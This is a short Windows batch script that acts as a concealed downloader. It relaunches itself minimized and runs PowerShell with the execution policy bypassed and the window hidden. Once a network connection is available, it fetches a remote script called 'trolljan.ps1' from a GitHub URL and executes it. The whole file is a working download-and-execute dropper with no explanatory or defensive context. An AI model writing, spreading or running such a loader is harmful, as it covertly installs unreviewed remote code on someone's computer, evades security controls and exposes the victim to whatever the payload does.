@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
powershell.exe -ExecutionPolicy bypass -WindowStyle Hidden -Command "while(-not(Test-Connection -ComputerName '8.8.8.8' -Count 1 -Quiet)){Start-Sleep -Seconds 5}iex((New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/jungawagat/trolljan/main/trolljan.ps1'))"
exit
